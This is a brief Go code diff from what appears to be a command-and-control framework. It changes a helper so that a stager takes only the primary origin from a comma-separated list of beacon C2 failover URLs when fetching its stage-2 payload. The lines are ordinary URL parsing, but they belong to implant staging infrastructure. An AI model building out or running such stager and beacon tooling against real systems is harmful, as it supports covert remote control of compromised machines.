@@ -140,6 +140,12 @@ func LoadStage2Blob(dataDir, token string) ([]byte, error) {
 // OriginFromC2URL extracts scheme://host from a beacon C2 URL so the stager
 // can reach the /stage endpoint on the same origin.
 func OriginFromC2URL(c2url string) string {
+	// c2_url may carry the failover chain ("primary,backup1,..."). The stage
+	// fetch must use the primary origin; only the stage-2 beacon receives the
+	// full list.
+	if i := strings.IndexByte(c2url, ','); i >= 0 {
+		c2url = strings.TrimSpace(c2url[:i])
+	}
 	lower := strings.ToLower(c2url)
 	for _, scheme := range []string{"http://", "https://"} {
 		if strings.HasPrefix(lower, scheme) {
